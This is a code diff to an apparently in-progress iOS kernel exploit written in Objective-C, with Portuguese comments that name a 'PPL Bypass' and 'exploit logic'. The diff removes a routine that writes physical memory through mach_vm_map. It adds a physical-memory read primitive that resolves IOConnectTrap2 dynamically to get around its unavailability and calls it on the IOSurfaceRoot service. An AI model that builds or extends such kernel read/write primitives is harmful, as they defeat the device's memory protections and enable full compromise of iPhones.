@@ -1,6 +1,7 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
 #import <IOKit/IOKitLib.h>
+#import <dlfcn.h>
 
 // --- DECLARAÇÕES OBRIGATÓRIAS PARA O COMPILADOR (iOS 26.4) ---
 typedef uint64_t mach_vm_address_t;
@@ -86,14 +87,24 @@ extern uint64_t IOConnectTrap2(io_connect_t, uint32_t, uintptr_t, uintptr_t);
     return val;
 }
 
-- (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
-    // Escrita direta via PPL Bypass (PTE writable confirmado no seu log)
-    uint64_t tg = 0;
-    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 3, 7, 0) == KERN_SUCCESS) {
-        *(uint64_t*)tg = v;
-        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
+- (uint64_t)physRead64:(uint64_t)pa {
+    uint64_t val = 0;
+    void *handle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+    IOConnectTrap2_t myIOConnectTrap2 = (IOConnectTrap2_t)dlsym(handle, "IOConnectTrap2");
+
+    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn;
+    if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0) {
+        // Chamada dinâmica para ignorar o erro de "unavailable"
+        if (myIOConnectTrap2) {
+            val = (uint64_t)myIOConnectTrap2(conn, 7, (uintptr_t)pa, 8);
+        }
+        IOServiceClose(conn);
     }
+    if (handle) dlclose(handle);
+    return val;
 }
+
 
 // --- LOGICA DO EXPLOIT ---
 
